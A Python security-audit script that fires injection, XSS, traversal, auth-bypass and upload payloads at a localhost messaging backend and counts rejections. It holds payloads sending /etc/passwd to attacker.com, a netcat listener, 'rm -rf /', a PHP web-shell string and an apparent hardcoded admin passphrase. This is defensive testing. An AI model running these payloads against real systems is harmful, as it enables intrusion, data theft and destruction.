#!/usr/bin/env python3
"""
🔥 BRUTAL COMPREHENSIVE SECURITY AUDIT - OMERTÁ BACKEND
State-Level Actor Security Analysis (NSA/Russia/North Korea/MI-6 Level Attacks)

OBJECTIVES:
1. Achieve 24/24 test success rate identification
2. Find every vulnerability (injection attacks, timing attacks, crypto flaws, authentication bypasses)
3. Test against advanced attack techniques
4. No bullshit assessment - honest brutal evaluation

COMPREHENSIVE TEST COVERAGE:
- All original core systems (notes, STEELOS, vault, PIN, admin, multi-sig)
- File sharing system (upload, download, delete, list, cleanup) 
- Voice message system (send, play, delete, list, cleanup)
- Advanced security tests (SQL injection, NoSQL injection, XSS, CSRF, timing attacks, etc.)
- Cryptographic implementation security
- Authentication and authorization flaws
- Rate limiting and brute force protection
- Memory management and RAM-only architecture
- API endpoint security and error handling
"""

import asyncio
import json
import requests
import time
import sys
import hashlib
import hmac
import secrets
import base64
import uuid
import threading
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Tuple
import concurrent.futures
import os

# Backend URL - Use the correct URL for testing
BACKEND_URL = "http://localhost:8001/api"

class BrutalSecurityAuditor:
    def __init__(self):
        self.results = []
        self.total_tests = 0
        self.passed_tests = 0
        self.failed_tests = 0
        self.critical_failures = []
        self.security_vulnerabilities = []
        self.test_device_id = f"audit_device_{uuid.uuid4().hex[:8]}"
        self.session = requests.Session()
        
    def log_test(self, test_name: str, success: bool, details: str = "", severity: str = "MEDIUM"):
        """Log test result with severity assessment"""
        self.total_tests += 1
        if success:
            self.passed_tests += 1
            status = "✅ PASS"
        else:
            self.failed_tests += 1
            status = "❌ FAIL"
            if severity == "CRITICAL":
                self.critical_failures.append({
                    'test': test_name,
                    'details': details,
                    'severity': severity
                })
            
        result = f"{status} | {test_name}"
        if details:
            result += f" | {details}"
        if severity != "MEDIUM":
            result += f" | SEVERITY: {severity}"
            
        print(result)
        self.results.append({
            'test': test_name,
            'success': success,
            'details': details,
            'severity': severity,
            'timestamp': datetime.now().isoformat()
        })

    def test_basic_connectivity(self):
        """Test basic API connectivity"""
        try:
            response = self.session.get(f"{BACKEND_URL}/", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get("message") == "Hello World":
                    self.log_test("Basic API Connectivity", True, "Root endpoint responding correctly")
                    return True
                else:
                    self.log_test("Basic API Connectivity", False, f"Unexpected response: {data}", "CRITICAL")
                    return False
            else:
                self.log_test("Basic API Connectivity", False, f"HTTP {response.status_code}", "CRITICAL")
                return False
        except Exception as e:
            self.log_test("Basic API Connectivity", False, f"Connection error: {str(e)}", "CRITICAL")
            return False

    def test_advanced_sql_injection_attacks(self):
        """Test advanced SQL injection techniques"""
        print("\n💉 TESTING ADVANCED SQL INJECTION ATTACKS")
        
        advanced_sql_payloads = [
            # Classic SQL injection
            "'; DROP TABLE notes; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            
            # Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05' --",
            "' OR (SELECT COUNT(*) FROM sysobjects) > 0 WAITFOR DELAY '0:0:5' --",
            
            # Boolean-based blind SQL injection
            "' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            
            # Error-based SQL injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            
            # Second-order SQL injection
            "admin'; INSERT INTO users VALUES ('hacker', 'password'); --",
            
            # NoSQL injection attempts
            "'; db.notes.drop(); //",
            "' || this.password == 'password' || '",
            "{\"$where\": \"this.password == 'password'\"}",
            
            # Advanced bypass techniques
            "'; /*comment*/ DROP /*comment*/ TABLE /*comment*/ notes; --",
            "' %55NION %53ELECT * FROM users --",  # URL encoded
            "' UNI/**/ON SEL/**/ECT * FROM users --",  # Comment bypass
        ]
        
        blocked_count = 0
        for i, payload in enumerate(advanced_sql_payloads):
            try:
                # Test on notes endpoint
                note_data = {
                    "ciphertext": payload,
                    "ttl_seconds": 3600,
                    "read_limit": 1
                }
                
                response = self.session.post(f"{BACKEND_URL}/notes", json=note_data, timeout=5)
                if response.status_code == 400:
                    blocked_count += 1
                elif response.status_code == 200:
                    # This is a potential vulnerability
                    self.security_vulnerabilities.append({
                        'type': 'SQL_INJECTION_BYPASS',
                        'payload': payload,
                        'endpoint': '/notes',
                        'response_code': response.status_code
                    })
                    
                # Also test on envelope endpoint
                envelope_data = {
                    "to_oid": payload,
                    "from_oid": "test_sender",
                    "ciphertext": "test_message"
                }
                
                response = self.session.post(f"{BACKEND_URL}/envelopes/send", json=envelope_data, timeout=5)
                if response.status_code == 400:
                    blocked_count += 1
                elif response.status_code == 200:
                    self.security_vulnerabilities.append({
                        'type': 'SQL_INJECTION_BYPASS',
                        'payload': payload,
                        'endpoint': '/envelopes/send',
                        'response_code': response.status_code
                    })
                    
            except Exception as e:
                blocked_count += 1  # Connection errors count as blocked
        
        total_attempts = len(advanced_sql_payloads) * 2  # Testing on 2 endpoints
        if blocked_count >= total_attempts * 0.9:  # 90% should be blocked
            self.log_test("Advanced SQL Injection Protection", True, 
                         f"Blocked {blocked_count}/{total_attempts} injection attempts")
        else:
            self.log_test("Advanced SQL Injection Protection", False, 
                         f"Only blocked {blocked_count}/{total_attempts} attempts - SECURITY VULNERABILITY", "CRITICAL")

    def test_advanced_xss_attacks(self):
        """Test advanced XSS bypass techniques"""
        print("\n🕷️ TESTING ADVANCED XSS ATTACKS")
        
        advanced_xss_payloads = [
            # Classic XSS
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            
            # Filter bypass techniques
            "<ScRiPt>alert('xss')</ScRiPt>",  # Case variation
            "<script>alert(String.fromCharCode(88,83,83))</script>",  # Character encoding
            "<svg onload=alert('xss')>",  # SVG-based XSS
            "<iframe src=javascript:alert('xss')>",  # iframe XSS
            
            # Event handler XSS
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(\"xss\")';</style>",
            "<link rel=stylesheet href=javascript:alert('xss')>",
            
            # Data URI XSS
            "<iframe src=data:text/html,<script>alert('xss')</script>>",
            
            # Polyglot payloads (work in multiple contexts)
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            
            # WAF bypass techniques
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</script>",
            "<script>window['alert'](document['domain'])</script>",
        ]
        
        blocked_count = 0
        for payload in advanced_xss_payloads:
            try:
                # Test XSS in note content
                note_data = {
                    "ciphertext": payload,
                    "meta": {"description": payload},
                    "ttl_seconds": 3600,
                    "read_limit": 1
                }
                
                response = self.session.post(f"{BACKEND_URL}/notes", json=note_data, timeout=5)
                if response.status_code == 400:
                    blocked_count += 1
                elif response.status_code == 200:
                    self.security_vulnerabilities.append({
                        'type': 'XSS_BYPASS',
                        'payload': payload,
                        'endpoint': '/notes',
                        'response_code': response.status_code
                    })
                    
            except Exception as e:
                blocked_count += 1
        
        if blocked_count >= len(advanced_xss_payloads) * 0.9:
            self.log_test("Advanced XSS Protection", True, 
                         f"Blocked {blocked_count}/{len(advanced_xss_payloads)} XSS attempts")
        else:
            self.log_test("Advanced XSS Protection", False, 
                         f"Only blocked {blocked_count}/{len(advanced_xss_payloads)} XSS attempts", "CRITICAL")

    def test_timing_attacks(self):
        """Test timing attack vulnerabilities"""
        print("\n⏱️ TESTING TIMING ATTACK VULNERABILITIES")
        
        # Test PIN verification timing
        try:
            # Test with correct PIN length vs incorrect length
            correct_length_times = []
            incorrect_length_times = []
            
            for _ in range(10):
                # Test correct length PIN (6 digits)
                start_time = time.time()
                pin_data = {
                    "device_id": self.test_device_id,
                    "pin": "123456",
                    "timestamp": int(time.time())
                }
                response = self.session.post(f"{BACKEND_URL}/pin/verify", json=pin_data, timeout=10)
                end_time = time.time()
                correct_length_times.append(end_time - start_time)
                
                # Test incorrect length PIN
                start_time = time.time()
                pin_data = {
                    "device_id": self.test_device_id,
                    "pin": "12",  # Too short
                    "timestamp": int(time.time())
                }
                response = self.session.post(f"{BACKEND_URL}/pin/verify", json=pin_data, timeout=10)
                end_time = time.time()
                incorrect_length_times.append(end_time - start_time)
                
                time.sleep(0.1)  # Small delay between requests
            
            avg_correct = sum(correct_length_times) / len(correct_length_times)
            avg_incorrect = sum(incorrect_length_times) / len(incorrect_length_times)
            
            # Check if timing difference is significant (>50ms difference could indicate vulnerability)
            timing_diff = abs(avg_correct - avg_incorrect)
            if timing_diff > 0.05:  # 50ms
                self.log_test("PIN Timing Attack Resistance", False, 
                             f"Timing difference: {timing_diff:.3f}s - potential timing attack vulnerability", "HIGH")
            else:
                self.log_test("PIN Timing Attack Resistance", True, 
                             f"Timing difference: {timing_diff:.3f}s - resistant to timing attacks")
                
        except Exception as e:
            self.log_test("PIN Timing Attack Resistance", False, f"Error: {str(e)}", "MEDIUM")

    def test_cryptographic_implementation(self):
        """Test cryptographic implementation security"""
        print("\n🔐 TESTING CRYPTOGRAPHIC IMPLEMENTATION")
        
        # Test STEELOS-Shredder cryptographic signatures
        try:
            # Deploy STEELOS-Shredder
            shredder_data = {
                "device_id": self.test_device_id,
                "trigger_type": "manual",
                "confirmation_token": "test_token"
            }
            
            response = self.session.post(f"{BACKEND_URL}/steelos-shredder/deploy", json=shredder_data, timeout=10)
            if response.status_code == 200:
                # Get kill token
                status_response = self.session.get(f"{BACKEND_URL}/steelos-shredder/status/{self.test_device_id}", timeout=10)
                if status_response.status_code == 200:
                    status_data = status_response.json()
                    if status_data.get('kill_token'):
                        kill_token = status_data['kill_token']
                        signature = kill_token.get('signature', '')
                        
                        # Verify signature format (HMAC-SHA256 should be 64 hex chars)
                        if len(signature) == 64 and all(c in '0123456789abcdef' for c in signature.lower()):
                            self.log_test("Cryptographic Signature Format", True, 
                                         f"Valid HMAC-SHA256 signature: {len(signature)} chars")
                            
                            # Test signature verification (attempt to forge)
                            token_data = kill_token.get('token_data', '')
                            if token_data:
                                # Try to forge signature with weak key
                                weak_signature = hmac.new(b"weak_key", token_data.encode(), hashlib.sha256).hexdigest()
                                if weak_signature != signature:
                                    self.log_test("Cryptographic Signature Strength", True, 
                                                 "Signature cannot be forged with weak key")
                                else:
                                    self.log_test("Cryptographic Signature Strength", False, 
                                                 "Signature can be forged - weak cryptographic key", "CRITICAL")
                            else:
                                self.log_test("Cryptographic Token Data", False, "No token data found", "HIGH")
                        else:
                            self.log_test("Cryptographic Signature Format", False, 
                                         f"Invalid signature format: {signature}", "CRITICAL")
                    else:
                        self.log_test("Cryptographic Kill Token", False, "No kill token generated", "HIGH")
                else:
                    self.log_test("Cryptographic Status Check", False, f"HTTP {status_response.status_code}", "MEDIUM")
            else:
                self.log_test("Cryptographic STEELOS Deploy", False, f"HTTP {response.status_code}", "MEDIUM")
                
        except Exception as e:
            self.log_test("Cryptographic Implementation", False, f"Error: {str(e)}", "MEDIUM")

    def test_authentication_bypass_attempts(self):
        """Test authentication bypass vulnerabilities"""
        print("\n🔓 TESTING AUTHENTICATION BYPASS ATTEMPTS")
        
        # Test admin authentication bypass
        try:
            bypass_attempts = [
                # SQL injection in passphrase
                {"admin_passphrase": "' OR '1'='1", "device_id": "test_device"},
                
                # NoSQL injection
                {"admin_passphrase": {"$ne": None}, "device_id": "test_device"},
                
                # Empty/null bypass
                {"admin_passphrase": "", "device_id": "test_device"},
                {"admin_passphrase": None, "device_id": "test_device"},
                
                # Array injection
                {"admin_passphrase": ["Omertaisthecode#01"], "device_id": "test_device"},
                
                # JSON injection
                {"admin_passphrase": '{"$regex": ".*"}', "device_id": "test_device"},
                
                # Unicode bypass
                {"admin_passphrase": "Omertaisthecode#０１", "device_id": "test_device"},  # Unicode zero/one
            ]
            
            bypass_blocked = 0
            for attempt in bypass_attempts:
                try:
                    response = self.session.post(f"{BACKEND_URL}/admin/authenticate", json=attempt, timeout=5)
                    if response.status_code in [400, 401, 422]:  # Properly rejected
                        bypass_blocked += 1
                    elif response.status_code == 200:
                        # Check if authentication actually succeeded
                        data = response.json()
                        if data.get('success') and data.get('session_token'):
                            self.security_vulnerabilities.append({
                                'type': 'AUTHENTICATION_BYPASS',
                                'payload': attempt,
                                'endpoint': '/admin/authenticate',
                                'response': data
                            })
                        else:
                            bypass_blocked += 1
                except Exception:
                    bypass_blocked += 1
            
            if bypass_blocked == len(bypass_attempts):
                self.log_test("Authentication Bypass Protection", True, 
                             f"All {len(bypass_attempts)} bypass attempts blocked")
            else:
                self.log_test("Authentication Bypass Protection", False, 
                             f"Only {bypass_blocked}/{len(bypass_attempts)} bypass attempts blocked", "CRITICAL")
                
        except Exception as e:
            self.log_test("Authentication Bypass Protection", False, f"Error: {str(e)}", "MEDIUM")

    def test_rate_limiting_bypass_techniques(self):
        """Test advanced rate limiting bypass techniques"""
        print("\n🚦 TESTING RATE LIMITING BYPASS TECHNIQUES")
        
        # Test distributed attack simulation
        try:
            # Test with different User-Agent headers
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "curl/7.68.0",
                "PostmanRuntime/7.28.4"
            ]
            
            # Test with different X-Forwarded-For headers (IP spoofing)
            fake_ips = [
                "192.168.1.100",
                "10.0.0.50",
                "172.16.0.25",
                "203.0.113.1",
                "198.51.100.1"
            ]
            
            bypass_successful = False
            total_requests = 0
            successful_requests = 0
            
            for i in range(20):  # Try 20 requests with different headers
                headers = {
                    'User-Agent': user_agents[i % len(user_agents)],
                    'X-Forwarded-For': fake_ips[i % len(fake_ips)],
                    'X-Real-IP': fake_ips[i % len(fake_ips)],
                    'X-Originating-IP': fake_ips[i % len(fake_ips)]
                }
                
                note_data = {
                    "ciphertext": f"rate_bypass_test_{i}",
                    "ttl_seconds": 60,
                    "read_limit": 1
                }
                
                try:
                    response = self.session.post(f"{BACKEND_URL}/notes", json=note_data, headers=headers, timeout=5)
                    total_requests += 1
                    
                    if response.status_code == 200:
                        successful_requests += 1
                    elif response.status_code == 429:
                        # Rate limit triggered - good
                        break
                        
                except Exception:
                    pass
                
                time.sleep(0.1)  # Small delay
            
            # If we got more than 10 successful requests, rate limiting might be bypassable
            if successful_requests > 10:
                self.log_test("Rate Limiting Bypass Resistance", False, 
                             f"Rate limiting bypassed: {successful_requests}/{total_requests} requests succeeded", "HIGH")
            else:
                self.log_test("Rate Limiting Bypass Resistance", True, 
                             f"Rate limiting effective: only {successful_requests}/{total_requests} requests succeeded")
                
        except Exception as e:
            self.log_test("Rate Limiting Bypass Resistance", False, f"Error: {str(e)}", "MEDIUM")

    def test_memory_management_security(self):
        """Test memory management and RAM-only architecture"""
        print("\n🧠 TESTING MEMORY MANAGEMENT SECURITY")
        
        # Test secure note memory clearing
        try:
            # Create a note
            note_data = {
                "ciphertext": "SENSITIVE_DATA_SHOULD_BE_CLEARED_FROM_MEMORY",
                "ttl_seconds": 3600,
                "read_limit": 1
            }
            
            response = self.session.post(f"{BACKEND_URL}/notes", json=note_data, timeout=10)
            if response.status_code == 200:
                data = response.json()
                note_id = data.get('id')
                
                if note_id:
                    # Read the note (should clear it from memory)
                    read_response = self.session.get(f"{BACKEND_URL}/notes/{note_id}", timeout=10)
                    if read_response.status_code == 200:
                        # Try to read again - should be gone
                        second_read = self.session.get(f"{BACKEND_URL}/notes/{note_id}", timeout=10)
                        if second_read.status_code == 404:
                            self.log_test("Memory Clearing - Secure Notes", True, 
                                         "Note properly cleared from memory after read")
                        else:
                            self.log_test("Memory Clearing - Secure Notes", False, 
                                         "Note still in memory after read - memory leak vulnerability", "HIGH")
                    else:
                        self.log_test("Memory Clearing - Note Read", False, f"HTTP {read_response.status_code}", "MEDIUM")
                else:
                    self.log_test("Memory Clearing - Note Creation", False, "No note ID returned", "MEDIUM")
            else:
                self.log_test("Memory Clearing - Note Creation", False, f"HTTP {response.status_code}", "MEDIUM")
                
        except Exception as e:
            self.log_test("Memory Management Security", False, f"Error: {str(e)}", "MEDIUM")

    def test_file_sharing_security(self):
        """Test file sharing system security"""
        print("\n📁 TESTING FILE SHARING SYSTEM SECURITY")
        
        try:
            # Test file upload with malicious content
            malicious_files = [
                # Executable files
                {"filename": "malware.exe", "content": b"MZ\x90\x00", "content_type": "application/octet-stream"},
                
                # Script files
                {"filename": "script.php", "content": b"<?php system($_GET['cmd']); ?>", "content_type": "text/plain"},
                {"filename": "script.js", "content": b"eval(atob('YWxlcnQoJ3hzcycp'))", "content_type": "text/javascript"},
                
                # Path traversal attempts
                {"filename": "../../../etc/passwd", "content": b"root:x:0:0:root:/root:/bin/bash", "content_type": "text/plain"},
                {"filename": "..\\..\\windows\\system32\\config\\sam", "content": b"binary_data", "content_type": "application/octet-stream"},
                
                # Large file (DoS attempt)
                {"filename": "large_file.txt", "content": b"A" * (10 * 1024 * 1024), "content_type": "text/plain"},  # 10MB
            ]
            
            upload_blocked = 0
            for file_data in malicious_files:
                try:
                    # Prepare multipart form data
                    files = {
                        'file': (file_data['filename'], file_data['content'], file_data['content_type'])
                    }
                    data = {
                        'device_id': self.test_device_id,
                        'auto_destruct_hours': 24
                    }
                    
                    response = self.session.post(f"{BACKEND_URL}/file-sharing/upload", 
                                               files=files, data=data, timeout=30)
                    
                    if response.status_code in [400, 403, 413, 422]:  # Properly rejected
                        upload_blocked += 1
                    elif response.status_code == 200:
                        # File was uploaded - check if it's a security issue
                        result = response.json()
                        if result.get('success'):
                            self.security_vulnerabilities.append({
                                'type': 'MALICIOUS_FILE_UPLOAD',
                                'filename': file_data['filename'],
                                'file_id': result.get('file_id'),
                                'endpoint': '/file-sharing/upload'
                            })
                        else:
                            upload_blocked += 1
                            
                except Exception:
                    upload_blocked += 1  # Connection errors count as blocked
            
            if upload_blocked >= len(malicious_files) * 0.8:  # 80% should be blocked
                self.log_test("File Upload Security", True, 
                             f"Blocked {upload_blocked}/{len(malicious_files)} malicious uploads")
            else:
                self.log_test("File Upload Security", False, 
                             f"Only blocked {upload_blocked}/{len(malicious_files)} malicious uploads", "HIGH")
                
        except Exception as e:
            self.log_test("File Sharing Security", False, f"Error: {str(e)}", "MEDIUM")

    def test_voice_message_security(self):
        """Test voice message system security"""
        print("\n🎤 TESTING VOICE MESSAGE SYSTEM SECURITY")
        
        try:
            # Test voice message upload with malicious content
            malicious_audio_data = [
                # Fake audio with script injection
                {"audio_data": "<script>alert('xss')</script>", "format": "text"},
                
                # Binary payload
                {"audio_data": base64.b64encode(b"\x00\x01\x02\x03" * 1000).decode(), "format": "base64"},
                
                # Extremely large payload (DoS)
                {"audio_data": base64.b64encode(b"A" * (5 * 1024 * 1024)).decode(), "format": "base64"},  # 5MB
                
                # SQL injection in metadata
                {"audio_data": "dGVzdCBhdWRpbw==", "format": "base64", "metadata": "'; DROP TABLE voice_messages; --"},
            ]
            
            upload_blocked = 0
            for voice_data in malicious_audio_data:
                try:
                    payload = {
                        "device_id": self.test_device_id,
                        "to_oid": "test_recipient",
                        "audio_data": voice_data["audio_data"],
                        "duration_seconds": 10,
                        "scrambled": True,
                        "auto_destruct_hours": 24
                    }
                    
                    if "metadata" in voice_data:
                        payload["metadata"] = voice_data["metadata"]
                    
                    response = self.session.post(f"{BACKEND_URL}/voice-messages/send", 
                                               json=payload, timeout=30)
                    
                    if response.status_code in [400, 403, 413, 422]:  # Properly rejected
                        upload_blocked += 1
                    elif response.status_code == 200:
                        result = response.json()
                        if result.get('success'):
                            self.security_vulnerabilities.append({
                                'type': 'MALICIOUS_VOICE_UPLOAD',
                                'payload': voice_data,
                                'message_id': result.get('message_id'),
                                'endpoint': '/voice-messages/send'
                            })
                        else:
                            upload_blocked += 1
                            
                except Exception:
                    upload_blocked += 1
            
            if upload_blocked >= len(malicious_audio_data) * 0.75:  # 75% should be blocked
                self.log_test("Voice Message Security", True, 
                             f"Blocked {upload_blocked}/{len(malicious_audio_data)} malicious voice uploads")
            else:
                self.log_test("Voice Message Security", False, 
                             f"Only blocked {upload_blocked}/{len(malicious_audio_data)} malicious voice uploads", "HIGH")
                
        except Exception as e:
            self.log_test("Voice Message Security", False, f"Error: {str(e)}", "MEDIUM")

    def test_race_condition_exploits(self):
        """Test race condition vulnerabilities"""
        print("\n🏃 TESTING RACE CONDITION EXPLOITS")
        
        try:
            # Test concurrent note creation/reading race condition
            def create_and_read_note():
                try:
                    # Create note
                    note_data = {
                        "ciphertext": f"race_condition_test_{threading.current_thread().ident}",
                        "ttl_seconds": 3600,
                        "read_limit": 1
                    }
                    
                    response = self.session.post(f"{BACKEND_URL}/notes", json=note_data, timeout=5)
                    if response.status_code == 200:
                        data = response.json()
                        note_id = data.get('id')
                        
                        if note_id:
                            # Immediately try to read multiple times
                            read_results = []
                            for _ in range(3):
                                read_response = self.session.get(f"{BACKEND_URL}/notes/{note_id}", timeout=5)
                                read_results.append(read_response.status_code)
                            
                            return read_results
                except Exception:
                    pass
                return []
            
            # Run multiple threads concurrently
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(create_and_read_note) for _ in range(5)]
                results = [future.result() for future in concurrent.futures.as_completed(futures)]
            
            # Check for race condition issues
            race_condition_detected = False
            for result in results:
                if len(result) > 1:
                    # Count successful reads (should only be 1 due to one-time read)
                    successful_reads = sum(1 for status in result if status == 200)
                    if successful_reads > 1:
                        race_condition_detected = True
                        break
            
            if race_condition_detected:
                self.log_test("Race Condition Protection", False, 
                             "Race condition detected - multiple reads of one-time note succeeded", "HIGH")
            else:
                self.log_test("Race Condition Protection", True, 
                             "No race conditions detected in concurrent operations")
                
        except Exception as e:
            self.log_test("Race Condition Protection", False, f"Error: {str(e)}", "MEDIUM")

    def test_csrf_protection(self):
        """Test CSRF protection mechanisms"""
        print("\n🛡️ TESTING CSRF PROTECTION")
        
        try:
            # Test if endpoints accept requests without proper headers
            csrf_test_endpoints = [
                {"method": "POST", "url": f"{BACKEND_URL}/notes", "data": {"ciphertext": "test", "ttl_seconds": 3600, "read_limit": 1}},
                {"method": "POST", "url": f"{BACKEND_URL}/steelos-shredder/deploy", "data": {"device_id": "test", "trigger_type": "manual"}},
                {"method": "POST", "url": f"{BACKEND_URL}/pin/verify", "data": {"device_id": "test", "pin": "123456"}},
            ]
            
            csrf_protected = 0
            for endpoint in csrf_test_endpoints:
                try:
                    # Create a new session without proper headers
                    csrf_session = requests.Session()
                    
                    # Remove security headers that might be automatically added
                    headers = {
                        'Origin': 'http://malicious-site.com',
                        'Referer': 'http://malicious-site.com/attack.html',
                        'User-Agent': 'Mozilla/5.0 (Malicious Bot)'
                    }
                    
                    if endpoint["method"] == "POST":
                        response = csrf_session.post(endpoint["url"], json=endpoint["data"], headers=headers, timeout=5)
                    
                    # Check if request was properly rejected
                    if response.status_code in [403, 400, 401]:
                        csrf_protected += 1
                    elif response.status_code == 200:
                        # Request succeeded - potential CSRF vulnerability
                        self.security_vulnerabilities.append({
                            'type': 'CSRF_VULNERABILITY',
                            'endpoint': endpoint["url"],
                            'method': endpoint["method"],
                            'response_code': response.status_code
                        })
                        
                except Exception:
                    csrf_protected += 1  # Connection errors count as protected
            
            if csrf_protected == len(csrf_test_endpoints):
                self.log_test("CSRF Protection", True, 
                             f"All {len(csrf_test_endpoints)} endpoints protected against CSRF")
            else:
                self.log_test("CSRF Protection", False, 
                             f"Only {csrf_protected}/{len(csrf_test_endpoints)} endpoints protected against CSRF", "HIGH")
                
        except Exception as e:
            self.log_test("CSRF Protection", False, f"Error: {str(e)}", "MEDIUM")

    def test_directory_traversal_attacks(self):
        """Test directory traversal and file inclusion attacks"""
        print("\n📂 TESTING DIRECTORY TRAVERSAL ATTACKS")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoded
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode bypass
            "/var/log/apache2/access.log",
            "/proc/self/environ",
            "C:\\boot.ini",
            "/etc/shadow",
        ]
        
        blocked_count = 0
        for payload in traversal_payloads:
            try:
                # Test in various parameters
                test_cases = [
                    # In note ciphertext
                    {"endpoint": "/notes", "data": {"ciphertext": payload, "ttl_seconds": 3600, "read_limit": 1}},
                    
                    # In envelope data
                    {"endpoint": "/envelopes/send", "data": {"to_oid": payload, "from_oid": "test", "ciphertext": "test"}},
                    
                    # In device ID
                    {"endpoint": "/steelos-shredder/deploy", "data": {"device_id": payload, "trigger_type": "manual"}},
                ]
                
                for test_case in test_cases:
                    response = self.session.post(f"{BACKEND_URL}{test_case['endpoint']}", 
                                               json=test_case['data'], timeout=5)
                    if response.status_code == 400:
                        blocked_count += 1
                    elif response.status_code == 200:
                        self.security_vulnerabilities.append({
                            'type': 'DIRECTORY_TRAVERSAL',
                            'payload': payload,
                            'endpoint': test_case['endpoint'],
                            'response_code': response.status_code
                        })
                        
            except Exception:
                blocked_count += 1
        
        total_attempts = len(traversal_payloads) * 3  # 3 test cases per payload
        if blocked_count >= total_attempts * 0.9:
            self.log_test("Directory Traversal Protection", True, 
                         f"Blocked {blocked_count}/{total_attempts} traversal attempts")
        else:
            self.log_test("Directory Traversal Protection", False, 
                         f"Only blocked {blocked_count}/{total_attempts} traversal attempts", "HIGH")

    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        print("\n💻 TESTING COMMAND INJECTION")
        
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(uname -a)",
            "; ping -c 1 127.0.0.1",
            "| nc -l 4444",
            "&& curl http://attacker.com/steal",
            "; rm -rf /",
            "$(curl -X POST http://attacker.com/exfiltrate -d @/etc/passwd)",
        ]
        
        blocked_count = 0
        for payload in command_payloads:
            try:
                # Test in various inputs
                test_data = [
                    {"ciphertext": f"test{payload}", "ttl_seconds": 3600, "read_limit": 1},
                    {"device_id": f"device{payload}", "trigger_type": "manual"},
                    {"to_oid": f"user{payload}", "from_oid": "test", "ciphertext": "test"},
                ]
                
                endpoints = ["/notes", "/steelos-shredder/deploy", "/envelopes/send"]
                
                for i, data in enumerate(test_data):
                    response = self.session.post(f"{BACKEND_URL}{endpoints[i]}", json=data, timeout=5)
                    if response.status_code == 400:
                        blocked_count += 1
                    elif response.status_code == 200:
                        self.security_vulnerabilities.append({
                            'type': 'COMMAND_INJECTION',
                            'payload': payload,
                            'endpoint': endpoints[i],
                            'response_code': response.status_code
                        })
                        
            except Exception:
                blocked_count += 1
        
        total_attempts = len(command_payloads) * 3
        if blocked_count >= total_attempts * 0.9:
            self.log_test("Command Injection Protection", True, 
                         f"Blocked {blocked_count}/{total_attempts} injection attempts")
        else:
            self.log_test("Command Injection Protection", False, 
                         f"Only blocked {blocked_count}/{total_attempts} injection attempts", "HIGH")

    def run_comprehensive_security_audit(self):
        """Run the complete brutal security audit"""
        print("🔥 BRUTAL COMPREHENSIVE SECURITY AUDIT - OMERTÁ BACKEND")
        print("State-Level Actor Security Analysis (NSA/Russia/North Korea/MI-6 Level)")
        print("=" * 80)
        
        # Basic connectivity check
        if not self.test_basic_connectivity():
            print("❌ CRITICAL: Basic connectivity failed. Aborting audit.")
            return
        
        # Core security tests
        print("\n🎯 CORE SECURITY SYSTEMS TESTING")
        self.test_advanced_sql_injection_attacks()
        self.test_advanced_xss_attacks()
        self.test_timing_attacks()
        self.test_cryptographic_implementation()
        self.test_authentication_bypass_attempts()
        self.test_rate_limiting_bypass_techniques()
        self.test_memory_management_security()
        
        # Application-specific tests
        print("\n🎯 APPLICATION-SPECIFIC SECURITY TESTING")
        self.test_file_sharing_security()
        self.test_voice_message_security()
        self.test_race_condition_exploits()
        self.test_csrf_protection()
        self.test_directory_traversal_attacks()
        self.test_command_injection()
        
        # Generate brutal assessment
        self.generate_brutal_assessment()

    def generate_brutal_assessment(self):
        """Generate brutal honest security assessment"""
        print("\n" + "=" * 80)
        print("🔥 BRUTAL SECURITY ASSESSMENT - NO BULLSHIT EVALUATION")
        print("=" * 80)
        
        success_rate = (self.passed_tests / self.total_tests * 100) if self.total_tests > 0 else 0
        
        print(f"📊 OVERALL RESULTS:")
        print(f"Total Tests: {self.total_tests}")
        print(f"✅ Passed: {self.passed_tests}")
        print(f"❌ Failed: {self.failed_tests}")
        print(f"🎯 Success Rate: {success_rate:.1f}%")
        print(f"🚨 Critical Failures: {len(self.critical_failures)}")
        print(f"🔓 Security Vulnerabilities: {len(self.security_vulnerabilities)}")
        
        # Critical failures analysis
        if self.critical_failures:
            print(f"\n🚨 CRITICAL SECURITY FAILURES:")
            for failure in self.critical_failures:
                print(f"  ❌ {failure['test']}: {failure['details']}")
        
        # Security vulnerabilities analysis
        if self.security_vulnerabilities:
            print(f"\n🔓 SECURITY VULNERABILITIES DISCOVERED:")
            vuln_types = {}
            for vuln in self.security_vulnerabilities:
                vuln_type = vuln['type']
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(vuln)
            
            for vuln_type, vulns in vuln_types.items():
                print(f"  🔴 {vuln_type}: {len(vulns)} instances")
                for vuln in vulns[:3]:  # Show first 3 examples
                    if 'endpoint' in vuln:
                        print(f"    - Endpoint: {vuln['endpoint']}")
                    if 'payload' in vuln:
